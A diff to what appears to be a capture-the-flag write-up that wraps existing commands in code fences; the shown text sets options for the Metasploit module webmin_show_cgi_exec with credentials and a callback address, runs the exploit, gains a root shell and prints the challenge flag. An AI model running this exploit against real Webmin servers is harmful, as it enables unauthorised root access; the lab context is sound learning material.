@@ -226,6 +226,7 @@ Module options (exploit/unix/webapp/webmin_show_cgi_exec):
 
 ```
 
+```
 set USERNAME agent47
 set PASSWORD videogamer124
 set RHOSTS 127.0.0.1
@@ -233,7 +234,9 @@ set RPORT 10000
 set SSL false
 set LHOST 10.9.11.184
 exploit
+```
 
+```
 id
 uid=0(root) gid=0(root) groups=0(root)
 cd /root
@@ -241,4 +244,4 @@ ls
 root.txt
 cat /root/root.txt
 a4b945830144bdd71908d12d902adeee
-
+```
